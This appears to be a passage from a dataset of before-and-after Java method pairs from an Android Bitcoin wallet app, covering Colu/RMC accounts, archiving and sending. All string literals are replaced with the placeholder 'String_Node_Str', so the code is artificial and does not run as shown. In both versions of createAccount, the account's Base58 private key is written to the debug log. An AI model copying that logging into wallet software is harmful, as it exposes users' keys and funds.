    if (((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
      tvWhatIsIt.setOnClickListener(new View.OnClickListener(){
        @Override public void onClick(        View view){
          new AlertDialog.Builder(view.getContext()).setMessage(resources.getString(R.string.rmc_bitcoin_acc_what_is_it)).setPositiveButton(R.string.button_ok,null).create().show();
        }
      }
);
      tvWhatIsIt.setVisibility(View.VISIBLE);
    }
 else {
      tvWhatIsIt.setVisibility(View.GONE);
    }
  }
 else {
    tvWhatIsIt.setVisibility(View.GONE);
  }
  if (name.length() == 0) {
    rowView.findViewById(R.id.tvLabel).setVisibility(View.GONE);
  }
 else {
    tvLabel.setVisibility(View.VISIBLE);
    tvLabel.setText(Html.fromHtml(name));
    tvLabel.setTextColor(textColor);
  }
  String displayAddress;
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (name.length() == 0) {
          displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    displayAddress=""String_Node_Str"";
  }
  TextView tvAddress=((TextView)rowView.findViewById(R.id.tvAddress));
  tvAddress.setText(displayAddress);
  tvAddress.setTextColor(textColor);
  rowView.setTag(walletAccount);
  if (walletAccount.isActive()) {
    CurrencyBasedBalance balance=walletAccount.getCurrencyBasedBalance();
    rowView.findViewById(R.id.tvBalance).setVisibility(View.VISIBLE);
    String balanceString=Utils.getFormattedValueWithUnit(balance.confirmed,mbwManager.getBitcoinDenomination());
    if (walletAccount instanceof ColuAccount) {
      balanceString=Utils.getColuFormattedValueWithUnit(walletAccount.getCurrencyBasedBalance().confirmed);
    }
    TextView tvBalance=((TextView)rowView.findViewById(R.id.tvBalance));
    tvBalance.setText(balanceString);
    tvBalance.setTextColor(textColor);
    boolean showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(showBackupMissingWarning ? View.VISIBLE : View.GONE);
  }
 else {
    rowView.findViewById(R.id.tvBalance).setVisibility(View.GONE);
    rowView.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
  }
  if (walletAccount.getId().equals(mbwManager.getLocalTraderManager().getLocalTraderAccountId())) {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.VISIBLE);
  }
 else {
    rowView.findViewById(R.id.tvTraderKey).setVisibility(View.GONE);
  }
  return rowView;
}"
91163,"public PoolStatisticInfo getStatistics(){
  Long totalRmcHashrate=getHashRate();
  if (totalRmcHashrate == null)   totalRmcHashrate=0L;
  Long yourRmcHashrate=getYourRmcHahrate(coluAccount.getAddress());
  if (yourRmcHashrate == null)   yourRmcHashrate=0L;
  return new PoolStatisticInfo(totalRmcHashrate,yourRmcHashrate);
}","public PoolStatisticInfo getStatistics(){
  Long totalRmcHashrate=getHashRate();
  if (totalRmcHashrate == null) {
    totalRmcHashrate=0L;
  }
  Long yourRmcHashrate=getYourRmcHahrate(coluAccount.getAddress());
  if (yourRmcHashrate == null) {
    yourRmcHashrate=0L;
  }
  return new PoolStatisticInfo(totalRmcHashrate,yourRmcHashrate);
}"
91164,"private Long getYourRmcHahrate(Address address){
  HttpRequestFactory requestFactory=new NetHttpTransport().createRequestFactory(new HttpRequestInitializer(){
    @Override public void initialize(    HttpRequest request){
      request.setParser(new JsonObjectParser(new JacksonFactory()));
    }
  }
);
  try {
    HttpRequest request=requestFactory.buildGetRequest(new GenericUrl(YOUR_RMC_HASHRATE_INFO_URL + address.toString()));
    HttpResponse response=request.execute();
    InputStream inputStream=response.getContent();
    ByteArrayOutputStream baos=new ByteArrayOutputStream();
    IOUtils.copy(inputStream,baos,true);
    return Long.parseLong(baos.toString().replace(""String_Node_Str"",""String_Node_Str""));
  }
 catch (  Exception ex) {
  }
  return null;
}","private Long getYourRmcHahrate(Address address){
  HttpRequestFactory requestFactory=new NetHttpTransport().createRequestFactory(new HttpRequestInitializer(){
    @Override public void initialize(    HttpRequest request){
      request.setParser(new JsonObjectParser(new JacksonFactory()));
    }
  }
);
  try {
    HttpRequest request=requestFactory.buildGetRequest(new GenericUrl(YOUR_RMC_HASHRATE_INFO_URL + address.toString()));
    HttpResponse response=request.execute();
    InputStream inputStream=response.getContent();
    ByteArrayOutputStream baos=new ByteArrayOutputStream();
    IOUtils.copy(inputStream,baos,true);
    return Long.parseLong(baos.toString().replace(""String_Node_Str"",""String_Node_Str""));
  }
 catch (  Exception ignored) {
  }
  return null;
}"
91165,"private Long getHashRate(){
  HttpRequestFactory requestFactory=new NetHttpTransport().createRequestFactory(new HttpRequestInitializer(){
    @Override public void initialize(    HttpRequest request){
      request.setParser(new JsonObjectParser(new JacksonFactory()));
    }
  }
);
  try {
    HttpRequest request=requestFactory.buildGetRequest(new GenericUrl(HASHRATE_INFO_API_URL));
    HttpResponse response=request.execute();
    InputStream inputStream=response.getContent();
    ByteArrayOutputStream baos=new ByteArrayOutputStream();
    IOUtils.copy(inputStream,baos,true);
    return Long.parseLong(baos.toString().replace(""String_Node_Str"",""String_Node_Str""));
  }
 catch (  Exception ex) {
  }
  return null;
}","private Long getHashRate(){
  HttpRequestFactory requestFactory=new NetHttpTransport().createRequestFactory(new HttpRequestInitializer(){
    @Override public void initialize(    HttpRequest request){
      request.setParser(new JsonObjectParser(new JacksonFactory()));
    }
  }
);
  try {
    HttpRequest request=requestFactory.buildGetRequest(new GenericUrl(HASHRATE_INFO_API_URL));
    HttpResponse response=request.execute();
    InputStream inputStream=response.getContent();
    ByteArrayOutputStream baos=new ByteArrayOutputStream();
    IOUtils.copy(inputStream,baos,true);
    return Long.parseLong(baos.toString().replace(""String_Node_Str"",""String_Node_Str""));
  }
 catch (  Exception ignored) {
  }
  return null;
}"
91166,"public ColuAccount(ColuManager manager,AccountBacking backing,MetadataStorage metadataStorage,InMemoryPrivateKey accountKey,ExchangeRateManager exchangeRateManager,Handler handler,Bus eventBus,WapiLogger logger,ColuAsset coluAsset){
  this.accountBacking=backing;
  this.manager=manager;
  this.eventBus=eventBus;
  this.handler=handler;
  this.exchangeRateManager=exchangeRateManager;
  this.metadataStorage=metadataStorage;
  this.coluAsset=coluAsset;
  this.satoshiAmount=0;
  this.accountKey=accountKey;
  this.address=this.accountKey.getPublicKey().toAddress(manager.getNetwork());
  uuid=getGuidForAsset(coluAsset,accountKey.getPublicKey().toAddress(getNetwork()).getAllAddressBytes());
  archived=metadataStorage.getArchived(uuid);
}","public ColuAccount(ColuManager manager,AccountBacking backing,MetadataStorage metadataStorage,InMemoryPrivateKey accountKey,ExchangeRateManager exchangeRateManager,ColuAsset coluAsset){
  this.accountBacking=backing;
  this.manager=manager;
  this.exchangeRateManager=exchangeRateManager;
  this.metadataStorage=metadataStorage;
  this.coluAsset=coluAsset;
  this.satoshiAmount=0;
  this.accountKey=accountKey;
  this.address=this.accountKey.getPublicKey().toAddress(manager.getNetwork());
  uuid=getGuidForAsset(coluAsset,accountKey.getPublicKey().toAddress(getNetwork()).getAllAddressBytes());
  archived=metadataStorage.getArchived(uuid);
}"
91167,"private ColuAccount createAccount(ColuAccount.ColuAsset coluAsset,InMemoryPrivateKey importKey){
  if (coluAsset == null) {
    Log.e(TAG,""String_Node_Str"");
    return null;
  }
  InMemoryPrivateKey accountKey;
  CreatedAccountInfo createdAccountInfo;
  try {
    if (importKey != null) {
      accountKey=importKey;
    }
 else {
      accountKey=new InMemoryPrivateKey(mgr.getRandomSource(),true);
    }
    createdAccountInfo=createSingleAddressAccount(accountKey,AesKeyCipher.defaultKeyCipher());
    addAssetAccountUUID(coluAsset,createdAccountInfo.id);
    Log.d(TAG,""String_Node_Str"" + accountKey.getBase58EncodedPrivateKey(getNetwork()));
  }
 catch (  KeyCipher.InvalidKeyCipher invalidKeyCipher) {
    throw new RuntimeException(invalidKeyCipher);
  }
  ColuAccount account=new ColuAccount(ColuManager.this,createdAccountInfo.accountBacking,metadataStorage,accountKey,exchangeRateManager,handler,eventBus,logger,coluAsset);
  coluAccounts.put(account.getId(),account);
  createColuAccountLabel(account);
  loadSingleAddressAccounts();
  return account;
}","private ColuAccount createAccount(ColuAccount.ColuAsset coluAsset,InMemoryPrivateKey importKey){
  if (coluAsset == null) {
    Log.e(TAG,""String_Node_Str"");
    return null;
  }
  InMemoryPrivateKey accountKey;
  CreatedAccountInfo createdAccountInfo;
  try {
    if (importKey != null) {
      accountKey=importKey;
    }
 else {
      accountKey=new InMemoryPrivateKey(mgr.getRandomSource(),true);
    }
    createdAccountInfo=createSingleAddressAccount(accountKey,AesKeyCipher.defaultKeyCipher());
    addAssetAccountUUID(coluAsset,createdAccountInfo.id);
    Log.d(TAG,""String_Node_Str"" + accountKey.getBase58EncodedPrivateKey(getNetwork()));
  }
 catch (  KeyCipher.InvalidKeyCipher invalidKeyCipher) {
    throw new RuntimeException(invalidKeyCipher);
  }
  ColuAccount account=new ColuAccount(ColuManager.this,createdAccountInfo.accountBacking,metadataStorage,accountKey,exchangeRateManager,coluAsset);
  coluAccounts.put(account.getId(),account);
  createColuAccountLabel(account);
  loadSingleAddressAccounts();
  return account;
}"
91168,"private void loadColuAccount(ColuAccount.ColuAsset coluAsset,UUID uuid){
  try {
    Log.d(TAG,""String_Node_Str"" + uuid.toString());
    CreatedAccountInfo createdAccountInfo=new CreatedAccountInfo();
    SingleAddressAccount singleAddressAccount;
    if (!_walletAccounts.containsKey(uuid))     return;
    createdAccountInfo.id=uuid;
    singleAddressAccount=(SingleAddressAccount)_walletAccounts.get(createdAccountInfo.id);
    InMemoryPrivateKey accountKey=singleAddressAccount.getPrivateKey(AesKeyCipher.defaultKeyCipher());
    createdAccountInfo.accountBacking=singleAddressAccount.getAccountBacking();
    ColuAccount account;
    if (accountKey == null) {
      account=new ColuAccount(ColuManager.this,createdAccountInfo.accountBacking,metadataStorage,singleAddressAccount.getAddress(),exchangeRateManager,handler,eventBus,logger,coluAsset);
    }
 else {
      account=new ColuAccount(ColuManager.this,createdAccountInfo.accountBacking,metadataStorage,accountKey,exchangeRateManager,handler,eventBus,logger,coluAsset);
    }
    coluAccounts.put(account.getId(),account);
    loadSingleAddressAccounts();
    account.setLabel(metadataStorage.getLabelByAccount(account.getId()));
  }
 catch (  InvalidKeyCipher e) {
    Log.e(TAG,e.toString());
  }
}","private void loadColuAccount(ColuAccount.ColuAsset coluAsset,UUID uuid){
  try {
    Log.d(TAG,""String_Node_Str"" + uuid.toString());
    CreatedAccountInfo createdAccountInfo=new CreatedAccountInfo();
    SingleAddressAccount singleAddressAccount;
    if (!_walletAccounts.containsKey(uuid))     return;
    createdAccountInfo.id=uuid;
    singleAddressAccount=(SingleAddressAccount)_walletAccounts.get(createdAccountInfo.id);
    InMemoryPrivateKey accountKey=singleAddressAccount.getPrivateKey(AesKeyCipher.defaultKeyCipher());
    createdAccountInfo.accountBacking=singleAddressAccount.getAccountBacking();
    ColuAccount account;
    if (accountKey == null) {
      account=new ColuAccount(ColuManager.this,createdAccountInfo.accountBacking,metadataStorage,singleAddressAccount.getAddress(),exchangeRateManager,handler,eventBus,logger,coluAsset);
    }
 else {
      account=new ColuAccount(ColuManager.this,createdAccountInfo.accountBacking,metadataStorage,accountKey,exchangeRateManager,coluAsset);
    }
    coluAccounts.put(account.getId(),account);
    loadSingleAddressAccounts();
    account.setLabel(metadataStorage.getLabelByAccount(account.getId()));
  }
 catch (  InvalidKeyCipher e) {
    Log.e(TAG,e.toString());
  }
}"
91169,"private void archive(final WalletAccount account){
  AlertDialog.Builder confirmDialog=new AlertDialog.Builder(getActivity());
  confirmDialog.setTitle(R.string.archiving_account_title);
  confirmDialog.setMessage(getString(R.string.question_archive_account));
  confirmDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
      account.archiveAccount();
      _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
      _mbwManager.getEventBus().post(new AccountChanged(account.getId()));
      updateIncludingMenus();
      _toaster.toast(R.string.archived,false);
    }
  }
);
  confirmDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
    }
  }
);
  confirmDialog.show();
}","private void archive(final WalletAccount account){
  AlertDialog.Builder confirmDialog=new AlertDialog.Builder(getActivity());
  confirmDialog.setTitle(R.string.archiving_account_title);
  confirmDialog.setMessage(getString(R.string.question_archive_account));
  confirmDialog.setPositiveButton(R.string.yes,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
      account.archiveAccount();
      WalletAccount linkedAccount=Utils.getLinkedAccount(account,_mbwManager.getColuManager().getAccounts().values());
      if (linkedAccount != null) {
        linkedAccount.archiveAccount();
      }
      _mbwManager.setSelectedAccount(_mbwManager.getWalletManager(false).getActiveAccounts().get(0).getId());
      _mbwManager.getEventBus().post(new AccountChanged(account.getId()));
      updateIncludingMenus();
      _toaster.toast(R.string.archived,false);
    }
  }
);
  confirmDialog.setNegativeButton(R.string.no,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface arg0,    int arg1){
    }
  }
);
  confirmDialog.show();
}"
91170,"private void activate(WalletAccount account){
  account.activateAccount();
  _mbwManager.setSelectedAccount(account.getId());
  updateIncludingMenus();
  _toaster.toast(R.string.activated,false);
  _mbwManager.getWalletManager(false).startSynchronization();
}","private void activate(WalletAccount account){
  account.activateAccount();
  WalletAccount linkedAccount=Utils.getLinkedAccount(account,_mbwManager.getColuManager().getAccounts().values());
  if (linkedAccount != null) {
    linkedAccount.activateAccount();
  }
  _mbwManager.setSelectedAccount(account.getId());
  updateIncludingMenus();
  _toaster.toast(R.string.activated,false);
  _mbwManager.getWalletManager(false).startSynchronization();
}"
91171,"@Override public void archiveAccount(){
  archived=true;
  metadataStorage.storeArchived(uuid,true);
}","@Override public void archiveAccount(){
  archived=true;
  metadataStorage.storeArchived(uuid,true);
  linkedAccount.archiveAccount();
}"
91172,"@Override protected boolean doSynchronization(SyncMode mode){
  try {
    manager.updateAccountBalance(this);
    if (linkedAccount != null) {
      linkedAccount.doSynchronization(SyncMode.NORMAL);
    }
  }
 catch (  IOException e) {
    Optional<String> balance=manager.getColuBalance(this.uuid);
    if (balance.isPresent()) {
      ExactCurrencyValue confirmed=ExactCurrencyValue.from(new BigDecimal(balance.get()),getColuAsset().name);
      setBalanceFiat(new CurrencyBasedBalance(confirmed,ExactCurrencyValue.from(BigDecimal.ZERO,getColuAsset().name),ExactCurrencyValue.from(BigDecimal.ZERO,getColuAsset().name)));
    }
  }
  return true;
}","@Override protected boolean doSynchronization(SyncMode mode){
  try {
    manager.updateAccountBalance(this);
    if (linkedAccount != null) {
      if (linkedAccount.isArchived()) {
        linkedAccount.activateAccount();
      }
      linkedAccount.doSynchronization(SyncMode.NORMAL);
    }
  }
 catch (  IOException e) {
    Optional<String> balance=manager.getColuBalance(this.uuid);
    if (balance.isPresent()) {
      ExactCurrencyValue confirmed=ExactCurrencyValue.from(new BigDecimal(balance.get()),getColuAsset().name);
      setBalanceFiat(new CurrencyBasedBalance(confirmed,ExactCurrencyValue.from(BigDecimal.ZERO,getColuAsset().name),ExactCurrencyValue.from(BigDecimal.ZERO,getColuAsset().name)));
    }
  }
  return true;
}"
91173,"@Override public void activateAccount(){
  archived=false;
  metadataStorage.storeArchived(uuid,false);
}","@Override public void activateAccount(){
  archived=false;
  metadataStorage.storeArchived(uuid,false);
  linkedAccount.activateAccount();
}"
91174,"public synchronized CurrencyValue getSumAsCurrency(String targetCurrency,ExchangeRateProvider exchangeRateProvider){
  CurrencyValue sum=ExactCurrencyValue.from(BigDecimal.ZERO,targetCurrency);
  for (  Map.Entry<String,CurrencyValue> value : buckets.entrySet()) {
    if (value.getValue() != null) {
      sum=sum.add(value.getValue(),exchangeRateProvider);
    }
  }
  return sum;
}","public synchronized CurrencyValue getSumAsCurrency(String targetCurrency,ExchangeRateProvider exchangeRateProvider){
  CurrencyValue sum=ExactCurrencyValue.from(BigDecimal.ZERO,targetCurrency);
  for (  Map.Entry<String,CurrencyValue> value : buckets.entrySet()) {
    if (value.getValue() != null) {
      CurrencyValue sumLocal=sum.add(value.getValue(),exchangeRateProvider);
      if (sumLocal.getValue() != null) {
        sum=sumLocal;
      }
    }
  }
  return sum;
}"
91175,"/** 
 * @param minerFeePerKbToUse Determines the dust level, at which including a UTXO costs more than it is worth.
 * @return all UTXOs that are spendable now, as they are neither locked coinbase outputs nor unconfirmed received coins if _allowZeroConfSpending is not set nor dust.
 */
protected Collection<TransactionOutputEx> getSpendableOutputs(long minerFeePerKbToUse){
  long satDustOutput=StandardTransactionBuilder.MAX_INPUT_SIZE * minerFeePerKbToUse / 1000;
  Collection<TransactionOutputEx> allUnspentOutputs=_backing.getAllUnspentOutputs();
  int blockChainHeight=getBlockChainHeight();
  Iterator<TransactionOutputEx> it=allUnspentOutputs.iterator();
  while (it.hasNext()) {
    TransactionOutputEx output=it.next();
    if (output.value < satDustOutput || output.isCoinBase && blockChainHeight - output.height < COINBASE_MIN_CONFIRMATIONS || !_allowZeroConfSpending && output.height == -1 && !isFromMe(output.outPoint.hash)) {
      it.remove();
    }
 else {
      Transaction transaction=TransactionEx.toTransaction(_backing.getTransaction(output.outPoint.hash));
      for (int i=0; i < transaction.outputs.length; i++) {
        TransactionOutput curOutput=transaction.outputs[i];
        byte[] scriptBytes=curOutput.script.getScriptBytes();
        if (curOutput.value == 0 && scriptBytes.length >= 4 && scriptBytes[2] == 0x43 & scriptBytes[3] == 0x43) {
          it.remove();
          break;
        }
      }
    }
  }
  return allUnspentOutputs;
}","/** 
 * @param minerFeePerKbToUse Determines the dust level, at which including a UTXO costs more than it is worth.
 * @return all UTXOs that are spendable now, as they are neither locked coinbase outputs nor unconfirmed received coins if _allowZeroConfSpending is not set nor dust.
 */
protected Collection<TransactionOutputEx> getSpendableOutputs(long minerFeePerKbToUse){
  long satDustOutput=StandardTransactionBuilder.MAX_INPUT_SIZE * minerFeePerKbToUse / 1000;
  Collection<TransactionOutputEx> allUnspentOutputs=_backing.getAllUnspentOutputs();
  int blockChainHeight=getBlockChainHeight();
  Iterator<TransactionOutputEx> it=allUnspentOutputs.iterator();
  while (it.hasNext()) {
    TransactionOutputEx output=it.next();
    if (output.value < satDustOutput || output.isCoinBase && blockChainHeight - output.height < COINBASE_MIN_CONFIRMATIONS || !_allowZeroConfSpending && output.height == -1 && !isFromMe(output.outPoint.hash)) {
      it.remove();
    }
 else {
      Transaction transaction=TransactionEx.toTransaction(_backing.getTransaction(output.outPoint.hash));
      for (int i=0; i < transaction.outputs.length; i++) {
        TransactionOutput curOutput=transaction.outputs[i];
        byte[] scriptBytes=curOutput.script.getScriptBytes();
        if (curOutput.value == 0 && scriptBytes.length >= 4 && scriptBytes[2] == 0x43 && scriptBytes[3] == 0x43) {
          it.remove();
          break;
        }
      }
    }
  }
  return allUnspentOutputs;
}"
91176,"private TransactionStatus tryCreateUnsignedColuTX(final PrepareCallback callback){
  Log.d(TAG,""String_Node_Str"");
  if (_account instanceof ColuAccount) {
    final ColuAccount coluAccount=(ColuAccount)_account;
    _unsigned=null;
    _preparedCoinapult=null;
    if (CurrencyValue.isNullOrZero(_amountToSend) || _receivingAddress == null) {
      Log.d(TAG,""String_Node_Str"");
      if (_amountToSend != null) {
        Log.d(TAG,""String_Node_Str"" + _amountToSend);
      }
 else {
        Log.d(TAG,""String_Node_Str"");
      }
      if (_receivingAddress != null) {
        Log.d(TAG,""String_Node_Str"" + _receivingAddress.toString());
      }
      return TransactionStatus.MissingArguments;
    }
    if (!_amountToSend.getCurrency().equals(coluAccount.getColuAsset().name)) {
      Log.d(TAG,""String_Node_Str"" + _amountToSend.getCurrency() + ""String_Node_Str""+ coluAccount.getColuAsset().name);
      return TransactionStatus.MissingArguments;
    }
    ExactCurrencyValue nativeAmount=ExactCurrencyValue.from(_amountToSend.getValue(),_amountToSend.getCurrency());
    Log.d(TAG,""String_Node_Str"");
    final ColuManager coluManager=_mbwManager.getColuManager();
    final long feePerKb=feePerKbValue;
    ColuTransactionData coluTransactionData=new ColuTransactionData(_receivingAddress,nativeAmount,coluAccount,feePerKb);
    if (callback != null) {
      new AsyncTask<ColuTransactionData,Void,ColuBroadcastTxHex.Json>(){
        @Override protected ColuBroadcastTxHex.Json doInBackground(        ColuTransactionData... params){
          if (!checkFee(true)) {
            if (coluAccount.getLinkedAccount() == feeColuAccount) {
              return createEmptyColuBroadcastJson();
            }
            List<WalletAccount.Receiver> receivers=new ArrayList<WalletAccount.Receiver>();
            long txFee=_mbwManager.getColuManager().getColuTransactionFee(feePerKb);
            long fundingAmountToSend=txFee + getAmountForColuTxOutputs();
            if (txFee < TransactionUtils.MINIMUM_OUTPUT_VALUE)             fundingAmountToSend=TransactionUtils.MINIMUM_OUTPUT_VALUE;
            WalletAccount.Receiver coluReceiver=new WalletAccount.Receiver(_account.getReceivingAddress().get(),fundingAmountToSend);
            receivers.add(coluReceiver);
            try {
              UnsignedTransaction fundingTransaction=feeColuAccount.createUnsignedTransaction(receivers,feePerKb);
              Transaction signedFundingTransaction=feeColuAccount.signTransaction(fundingTransaction,AesKeyCipher.defaultKeyCipher());
              WalletAccount.BroadcastResult broadcastResult=feeColuAccount.broadcastTransaction(signedFundingTransaction);
              if (broadcastResult != WalletAccount.BroadcastResult.SUCCESS) {
                return createEmptyColuBroadcastJson();
              }
              coluManager.broadcastTransaction(signedFundingTransaction);
            }
 catch (            OutputTooSmallException|InsufficientFundsException|UnableToBuildTransactionException|KeyCipher.InvalidKeyCipher ex) {
              return createEmptyColuBroadcastJson();
            }
            for (int attemtps=0; attemtps < 10; attemtps++) {
              if (checkFee(true)) {
                Log.d(TAG,""String_Node_Str"");
                break;
              }
              try {
                Thread.sleep(ColuManager.TIME_INTERVAL_BETWEEN_BALANCE_FUNDING_CHECKS);
              }
 catch (              InterruptedException e) {
                e.printStackTrace();
              }
            }
          }
          return coluManager.prepareColuTx(params[0].getReceivingAddress(),params[0].getNativeAmount(),params[0].getColuAccount(),(int)params[0].getFeePerKb());
        }
        @Override protected void onPostExecute(        ColuBroadcastTxHex.Json preparedTransaction){
          super.onPostExecute(preparedTransaction);
          Log.d(TAG,""String_Node_Str"");
          if (preparedTransaction != null && !preparedTransaction.txHex.isEmpty()) {
            Log.d(TAG,""String_Node_Str"" + preparedTransaction.txHex);
            _preparedColuTx=preparedTransaction;
            if (callback != null) {
              callback.success();
            }
            Toast.makeText(SendMainActivity.this,R.string.colu_succeeded_to_prepare,Toast.LENGTH_SHORT).show();
          }
 else {
            if (callback != null) {
              callback.fail();
            }
            Toast.makeText(SendMainActivity.this,getString(R.string.colu_failed_to_prepare),Toast.LENGTH_SHORT).show();
            updateUi();
          }
        }
      }
.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR,coluTransactionData);
    }
    return TransactionStatus.OK;
  }
  Log.e(TAG,""String_Node_Str"");
  return TransactionStatus.MissingArguments;
}","private TransactionStatus tryCreateUnsignedColuTX(final PrepareCallback callback){
  Log.d(TAG,""String_Node_Str"");
  if (_account instanceof ColuAccount) {
    final ColuAccount coluAccount=(ColuAccount)_account;
    _unsigned=null;
    _preparedCoinapult=null;
    if (CurrencyValue.isNullOrZero(_amountToSend) || _receivingAddress == null) {
      Log.d(TAG,""String_Node_Str"");
      if (_amountToSend != null) {
        Log.d(TAG,""String_Node_Str"" + _amountToSend);
      }
 else {
        Log.d(TAG,""String_Node_Str"");
      }
      if (_receivingAddress != null) {
        Log.d(TAG,""String_Node_Str"" + _receivingAddress.toString());
      }
      return TransactionStatus.MissingArguments;
    }
    if (!_amountToSend.getCurrency().equals(coluAccount.getColuAsset().name)) {
      Log.d(TAG,""String_Node_Str"" + _amountToSend.getCurrency() + ""String_Node_Str""+ coluAccount.getColuAsset().name);
      return TransactionStatus.MissingArguments;
    }
    ExactCurrencyValue nativeAmount=ExactCurrencyValue.from(_amountToSend.getValue(),_amountToSend.getCurrency());
    Log.d(TAG,""String_Node_Str"");
    final ColuManager coluManager=_mbwManager.getColuManager();
    final long feePerKb=feePerKbValue;
    ColuTransactionData coluTransactionData=new ColuTransactionData(_receivingAddress,nativeAmount,coluAccount,feePerKb);
    if (callback != null) {
      new AsyncTask<ColuTransactionData,Void,ColuBroadcastTxHex.Json>(){
        @Override protected ColuBroadcastTxHex.Json doInBackground(        ColuTransactionData... params){
          if (!checkFee(true)) {
            if (coluAccount.getLinkedAccount() == feeColuAccount) {
              return createEmptyColuBroadcastJson();
            }
            List<WalletAccount.Receiver> receivers=new ArrayList<WalletAccount.Receiver>();
            long txFee=_mbwManager.getColuManager().getColuTransactionFee(feePerKb);
            long fundingAmountToSend=txFee + getAmountForColuTxOutputs();
            if (txFee < TransactionUtils.MINIMUM_OUTPUT_VALUE)             fundingAmountToSend=TransactionUtils.MINIMUM_OUTPUT_VALUE;
            WalletAccount.Receiver coluReceiver=new WalletAccount.Receiver(_account.getReceivingAddress().get(),fundingAmountToSend);
            receivers.add(coluReceiver);
            try {
              UnsignedTransaction fundingTransaction=feeColuAccount.createUnsignedTransaction(receivers,feePerKb);
              Transaction signedFundingTransaction=feeColuAccount.signTransaction(fundingTransaction,AesKeyCipher.defaultKeyCipher());
              WalletAccount.BroadcastResult broadcastResult=feeColuAccount.broadcastTransaction(signedFundingTransaction);
              if (broadcastResult != WalletAccount.BroadcastResult.SUCCESS) {
                return createEmptyColuBroadcastJson();
              }
              coluManager.broadcastTransaction(signedFundingTransaction);
            }
 catch (            OutputTooSmallException|InsufficientFundsException|UnableToBuildTransactionException|KeyCipher.InvalidKeyCipher ex) {
              return createEmptyColuBroadcastJson();
            }
            for (int attemtps=0; attemtps < 10; attemtps++) {
              if (checkFee(true)) {
                Log.d(TAG,""String_Node_Str"");
                break;
              }
              try {
                Thread.sleep(ColuManager.TIME_INTERVAL_BETWEEN_BALANCE_FUNDING_CHECKS);
              }
 catch (              InterruptedException e) {
                e.printStackTrace();
              }
            }
          }
          return coluManager.prepareColuTx(params[0].getReceivingAddress(),params[0].getNativeAmount(),params[0].getColuAccount(),(int)params[0].getFeePerKb());
        }
        @Override protected void onPostExecute(        ColuBroadcastTxHex.Json preparedTransaction){
          super.onPostExecute(preparedTransaction);
          Log.d(TAG,""String_Node_Str"");
          if (preparedTransaction != null && !preparedTransaction.txHex.isEmpty()) {
            Log.d(TAG,""String_Node_Str"" + preparedTransaction.txHex);
            _preparedColuTx=preparedTransaction;
            if (callback != null) {
              callback.success();
            }
          }
 else {
            if (callback != null) {
              callback.fail();
            }
            Toast.makeText(SendMainActivity.this,getString(R.string.colu_failed_to_prepare),Toast.LENGTH_SHORT).show();
            updateUi();
          }
        }
      }
.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR,coluTransactionData);
    }
    return TransactionStatus.OK;
  }
  Log.e(TAG,""String_Node_Str"");
  return TransactionStatus.MissingArguments;
}"
91177,"@Override protected void onPostExecute(ColuBroadcastTxHex.Json preparedTransaction){
  super.onPostExecute(preparedTransaction);
  Log.d(TAG,""String_Node_Str"");
  if (preparedTransaction != null && !preparedTransaction.txHex.isEmpty()) {
    Log.d(TAG,""String_Node_Str"" + preparedTransaction.txHex);
    _preparedColuTx=preparedTransaction;
    if (callback != null) {
      callback.success();
    }
    Toast.makeText(SendMainActivity.this,R.string.colu_succeeded_to_prepare,Toast.LENGTH_SHORT).show();
  }
 else {
    if (callback != null) {
      callback.fail();
    }
    Toast.makeText(SendMainActivity.this,getString(R.string.colu_failed_to_prepare),Toast.LENGTH_SHORT).show();
    updateUi();
  }
}","@Override protected void onPostExecute(ColuBroadcastTxHex.Json preparedTransaction){
  super.onPostExecute(preparedTransaction);
  Log.d(TAG,""String_Node_Str"");
  if (preparedTransaction != null && !preparedTransaction.txHex.isEmpty()) {
    Log.d(TAG,""String_Node_Str"" + preparedTransaction.txHex);
    _preparedColuTx=preparedTransaction;
    if (callback != null) {
      callback.success();
    }
  }
 else {
    if (callback != null) {
      callback.fail();
    }
    Toast.makeText(SendMainActivity.this,getString(R.string.colu_failed_to_prepare),Toast.LENGTH_SHORT).show();
    updateUi();
  }
}"
91178,"@Override public void onClick(View view){
  if (!Utils.isConnected(getActivity())) {
    new AlertDialog.Builder(getActivity()).setMessage(R.string.no_network_connection).setPositiveButton(R.string.button_ok,null).create().show();
  }
 else   if (Calendar.getInstance().before(Keys.getICOStart()) && !BuildConfig.DEBUG) {
    new AlertDialog.Builder(getActivity()).setMessage(R.string.ico_will_start).setPositiveButton(R.string.button_ok,null).create().show();
  }
 else {
    Utils.showOptionalMessage(getActivity(),R.string.mycelium_no_responaility_rmc,new Runnable(){
      @Override public void run(){
        startActivity(new Intent(getActivity(),RmcActivity.class));
      }
    }
);
  }
}","@Override public void onClick(View view){
  Intent intent=new Intent(getActivity(),BuySellSelectFragment.class);
  startActivity(intent);
}"
91179,"private void updateUi(){
  View btBuySell=_root.findViewById(R.id.btBuySellBitcoin);
